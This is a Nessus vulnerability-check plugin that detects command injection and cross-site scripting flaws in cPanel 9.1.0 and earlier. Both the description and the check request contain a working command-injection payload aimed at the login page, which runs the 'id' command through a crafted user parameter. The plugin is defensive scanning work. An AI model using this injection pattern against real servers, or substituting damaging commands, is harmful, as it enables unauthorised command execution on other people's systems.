#
# (C) Tenable Network Security, Inc.
# 

include("compat.inc");

if(description)
{
 script_id(12097);
 script_version("$Revision: 1.21 $");
 script_cve_id("CVE-2004-1769", "CVE-2004-1770", "CVE-2004-2308");
 script_bugtraq_id(9848, 9853, 9855);
 script_osvdb_id(4205, 4218, 4219);

 script_name(english:"cPanel <= 9.1.0 Multiple Vulnerabilities");
 script_summary(english:"Tries to execute a command");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by 
multiple issues." );
 script_set_attribute(attribute:"description", value:
'The version of cPanel installed on the remote host is version
9.1.0 (or earlier) and thus reportedly affected by multiple
issues:

 - The dohtaccess.html script fails to sanitize input supplied
   by a user and is affected by a cross-site scripting 
   vulnerability. (CVE-2004-2308)

 - Both the Login Page and resetpass functionality fail to 
   sanitize user input and can be manipulated to execute
   arbitrary commands (CVE-2004-1769 & CVE-2004-1770). For 
   example, the following URL demonstrates the id command 
   being executed:

   http://www.example.com:2082/login/?user=|"`id`"|' );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the newest version of cPanel or disable this service" );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/03/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/03/11");
 script_cvs_date("$Date: 2011/03/15 19:22:14 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 2082);
 exit(0);
}

# Check starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


http_check_remote_code (
			default_port:2082,
			unique_dir:"/login",
			check_request:'/?user=|"`id`"|',
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
